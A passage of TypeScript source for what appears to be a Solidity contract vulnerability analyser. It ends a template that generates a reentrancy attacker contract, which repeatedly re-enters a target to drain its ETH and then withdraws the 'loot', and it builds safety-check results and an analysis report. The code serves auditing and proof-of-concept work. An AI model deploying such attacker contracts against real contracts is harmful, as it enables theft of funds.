     * 5. target sends us MORE ETH
     * 6. Repeat until contract is drained or gas runs out
     */
    receive() external payable {
        // Safety: Limit iterations to prevent out-of-gas
        if (attackCount < MAX_ATTACKS && address(target).balance >= msg.value) {
            attackCount++;
            // RE-ENTER THE VULNERABLE FUNCTION!
            target.${funcName}();
        }
    }

    /**
     * @notice Withdraw stolen funds to EOA
     */
    function withdrawLoot(address payable to) external {
        to.transfer(address(this).balance);
    }
}`;
}

// ============= SAFETY CHECKS GENERATOR =============

function generateSafetyChecks(parsed: ParsedContract, vulnerabilities: Vulnerability[]): SafetyCheck[] {
  const checks: SafetyCheck[] = [];
  const vulnTypes = new Set(vulnerabilities.map((v) => v.type));

  // Check Solidity version for overflow protection
  const version = parsed.pragmaVersion ? extractVersion(parsed.pragmaVersion) : null;
  const hasSolidity08Plus = version && version.minor >= 8;

  // Reentrancy check
  if (!vulnTypes.has('reentrancy')) {
    checks.push({
      category: 'Reentrancy',
      pattern: 'External calls before state updates',
      status: 'safe',
      reason: 'No external calls found before state variable updates. Contract follows Checks-Effects-Interactions pattern.',
    });
  }

  // Access control check
  if (!vulnTypes.has('access-control')) {
    checks.push({
      category: 'Access Control',
      pattern: 'Sensitive functions without authorization',
      status: 'safe',
      reason: 'All sensitive functions have appropriate access control modifiers or msg.sender validation.',
    });
  }

  // Integer overflow check
  if (hasSolidity08Plus) {
    checks.push({
      category: 'Integer Overflow',
      pattern: 'Arithmetic operations without bounds checking',
      status: 'safe',
      reason: `Using Solidity ${parsed.pragmaVersion} which has built-in overflow/underflow protection.`,
    });
  } else if (!vulnTypes.has('integer-overflow') && !vulnTypes.has('integer-underflow')) {
    checks.push({
      category: 'Integer Overflow',
      pattern: 'Arithmetic operations without bounds checking',
      status: 'safe',
      reason: 'No arithmetic operations detected in vulnerable contexts.',
    });
  }

  // Selfdestruct check
  if (!vulnTypes.has('unprotected-selfdestruct')) {
    checks.push({
      category: 'Selfdestruct',
      pattern: 'Unprotected selfdestruct calls',
      status: 'safe',
      reason: 'No unprotected selfdestruct or suicide calls detected.',
    });
  }

  return checks;
}

// ============= MAIN ANALYZE FUNCTION =============

export function analyzeContract(source: string): AnalysisResult {
  const { parsed } = parseSource(source);
  const vulnerabilities = detectVulnerabilities(parsed);

  const primaryContract = parsed.contracts[parsed.contracts.length - 1];
  const contractName = primaryContract?.name || 'Unknown';

  const exploitCode = generateExploitCode(vulnerabilities, contractName);
  const safetyChecks = generateSafetyChecks(parsed, vulnerabilities);

  return {
    contractName,
    solcVersion: parsed.pragmaVersion,
    vulnerabilities,
    exploitCode,
    summary: {
      critical: vulnerabilities.filter((v) => v.severity === 'CRITICAL').length,
      high: vulnerabilities.filter((v) => v.severity === 'HIGH').length,
      medium: vulnerabilities.filter((v) => v.severity === 'MEDIUM').length,
      low: vulnerabilities.filter((v) => v.severity === 'LOW').length,
      total: vulnerabilities.length,
    },
    safetyChecks,
    limitations: ANALYSIS_LIMITATIONS,
  };
}
